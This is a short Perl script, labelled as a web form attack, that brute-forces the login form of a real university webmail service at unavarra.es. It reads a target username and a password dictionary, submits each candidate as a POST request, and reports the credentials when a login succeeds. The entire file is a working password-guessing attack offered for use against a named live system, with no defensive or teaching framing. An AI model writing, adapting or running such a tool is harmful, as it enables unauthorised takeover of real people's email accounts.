# correo alumnos web form attack perl script
use LWP::UserAgent;
use Term::ANSIColor;
use strict ;
use warnings;
if ($#ARGV < 1) {	
	print "Usage:\n";
	print "perl correoA.pl <username> <dictionaryFile>\n";
	exit();
}
my $correoAurl = "https://webmail.unavarra.es/correo2/src/redirect.php";
my $user = $ARGV[0];
my $file = $ARGV[1]; 
open (FILE,$file) || die color("red"), "Could not open file '$file'\n", color("reset");
my @dictionary = <FILE> ;
my $wagent = new LWP::UserAgent;
my $request = new HTTP::Request 'POST',$correoAurl;
$a=0;
foreach(@dictionary) {
	my $password = $_ ;
        $a+=1;
	chomp($password);
        if ($password =~ /ñ/){
               print color("red"), "The passwords of this site cannot contain  the letter ñ\n", color("reset");
               $password=chomp($password);
        }
	$request->content_type('application/x-www-form-urlencoded');
        $request->content("&dominioupna=a&login_username=$user&secretkey=$password&js_autodetect_results=1&just_logged_in=1&loginServer=%40e.unavarra.es");
	my $respons = $wagent->request($request);		
	my $response = $respons->as_string;
	if ( $response !~ /Usuario o contraseña incorrecto/ && $response !~ /Access denied. Please contact your system administrator/ && $response !~ /500 Can't connect to webmail.unavarra.es/) {	
		print color("green"),"Successful attack! Credentials are: username=$user and password=$password\n", color("reset");
                exit() ;	
	}
        if ( $response =~ /500 Can't connect to webmail.unavarra.es/){
                print "An error 500 has occurred"
        }
        if ($a%100==0){
                print "$a passwords tested\n" ;
        }	
	
}
